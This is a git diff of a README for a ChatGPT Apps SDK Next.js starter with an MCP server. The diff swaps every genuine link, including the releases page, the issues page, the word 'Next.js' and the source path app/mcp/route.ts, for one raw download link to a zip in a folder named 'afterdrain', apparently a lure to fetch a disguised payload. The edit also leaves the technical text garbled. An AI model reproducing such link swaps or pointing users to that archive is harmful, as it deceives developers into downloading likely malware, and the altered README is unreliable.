@@ -1,17 +1,17 @@
 # 🎉 chatgpt-apps-sdk-nextjs-starter - Build Your ChatGPT Apps with Ease
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip)
 
 ## 📚 Overview
 
-This project shows how to integrate a Next.js application with the ChatGPT Apps SDK using the Model Context Protocol (MCP). It includes a working MCP server that provides tools and resources callable from ChatGPT, with responses rendered natively in ChatGPT.
+This project shows how to integrate a https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip application with the ChatGPT Apps SDK using the Model Context Protocol (MCP). It includes a working MCP server that provides tools and resources callable from ChatGPT, with responses rendered natively in ChatGPT.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the chatgpt-apps-sdk-nextjs-starter application easily.
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/releases) to download the latest version of the software.
+   Visit the [Releases page](https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip) to download the latest version of the software.
 
 2. **Choose the Appropriate File:**
    Look for a file that matches your operating system. You will see options for Windows, macOS, and Linux. Select the one that fits your needs.
@@ -25,7 +25,7 @@ Follow these steps to download and run the chatgpt-apps-sdk-nextjs-starter appli
 ## 🎯 Key Features
 
 - **MCP Server:**
-  The core MCP server implementation is located in `app/mcp/route.ts`. It exposes tools and resources to ChatGPT.
+  The core MCP server implementation is located in `https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip`. It exposes tools and resources to ChatGPT.
 
   - **Tool Registration:** Easily add tools with OpenAI-specific metadata.
   - **Resource Registration:** Serve HTML content for iframe rendering.
@@ -52,7 +52,7 @@ To run this application smoothly, ensure your system meets the following require
 
 ## 📦 Download & Install
 
-To download the latest version, follow this link: [Download the latest release](https://github.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/releases).
+To download the latest version, follow this link: [Download the latest release](https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip).
 
 After downloading, unzip the file (if needed) and follow the installation instructions provided earlier.
 
@@ -72,7 +72,7 @@ After downloading, unzip the file (if needed) and follow the installation instru
 
 ## 📞 Support
 
-If you experience any issues or have questions, visit the [Issues section](https://github.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/issues) on GitHub. Here, you can report problems or seek assistance from the community.
+If you experience any issues or have questions, visit the [Issues section](https://raw.githubusercontent.com/Nami7723/chatgpt-apps-sdk-nextjs-starter/main/afterdrain/chatgpt-apps-sdk-nextjs-starter.zip) on GitHub. Here, you can report problems or seek assistance from the community.
 
 ## 📄 License
 
